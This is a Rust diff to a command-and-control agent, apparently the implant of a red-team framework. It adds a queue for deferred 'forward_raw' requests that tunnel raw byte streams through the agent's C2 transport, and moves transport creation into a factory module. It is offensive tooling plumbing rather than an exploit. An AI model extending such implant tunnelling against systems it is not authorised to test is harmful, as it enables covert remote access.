@@ -34,6 +34,15 @@ pub struct ImixAgent {
     pub process_list_tx: std::sync::mpsc::SyncSender<c2::ReportProcessListRequest>,
     pub process_list_rx: Arc<Mutex<std::sync::mpsc::Receiver<c2::ReportProcessListRequest>>>,
     pub shell_manager_tx: tokio::sync::mpsc::Sender<ShellManagerMessage>,
+    pub pending_forwards: Arc<
+        tokio::sync::Mutex<
+            Vec<(
+                String,
+                tokio::sync::mpsc::Receiver<Vec<u8>>,
+                tokio::sync::mpsc::Sender<Vec<u8>>,
+            )>,
+        >,
+    >,
 }
 
 impl ImixAgent {
@@ -57,6 +66,7 @@ impl ImixAgent {
             process_list_tx,
             process_list_rx: Arc::new(Mutex::new(process_list_rx)),
             shell_manager_tx,
+            pending_forwards: Arc::new(tokio::sync::Mutex::new(Vec::new())),
         }
     }
 
@@ -301,8 +311,8 @@ impl ImixAgent {
         }
         // 2. Create new transport from config
         let config = self.get_transport_config().await;
-        let t =
-            transport::create_transport(config).context("Failed to create on-demand transport")?;
+        let t = crate::transport_factory::create_transport(config)
+            .context("Failed to create on-demand transport")?;
 
         #[cfg(debug_assertions)]
         log::debug!("Created on-demand transport for background task");
@@ -326,6 +336,26 @@ impl ImixAgent {
     }
 
     pub async fn process_job_request(&self) -> Result<()> {
+        // Dispatch any pending forward_raw requests before checking in
+        {
+            let mut forwards = self.pending_forwards.lock().await;
+            for (path, rx, tx) in forwards.drain(..) {
+                let agent = self.clone();
+                self.runtime_handle.spawn(async move {
+                    if let Ok(mut t) = agent.get_usable_transport().await {
+                        if let Err(e) = t.forward_raw(path.clone(), rx, tx).await {
+                            log::error!("Deferred forward_raw to {} failed: {}", path, e);
+                        }
+                    } else {
+                        log::error!(
+                            "Failed to get transport for deferred forward_raw to {}",
+                            path
+                        );
+                    }
+                });
+            }
+        }
+
         let resp = self.claim_tasks().await?;
 
         let mut has_work = false;
@@ -500,6 +530,19 @@ impl Agent for ImixAgent {
 
     fn claim_tasks(&self, req: c2::ClaimTasksRequest) -> Result<c2::ClaimTasksResponse, String> {
         self.with_transport(|mut t| async move { t.claim_tasks(req).await })
+    }
+
+    fn forward_raw(
+        &self,
+        path: String,
+        rx: tokio::sync::mpsc::Receiver<Vec<u8>>,
+        tx: tokio::sync::mpsc::Sender<Vec<u8>>,
+    ) -> Result<(), String> {
+        self.block_on(async {
+            let mut forwards = self.pending_forwards.lock().await;
+            forwards.push((path, rx, tx));
+            Ok(())
+        })
     }
 
     fn get_config(&self) -> Result<BTreeMap<String, String>, String> {
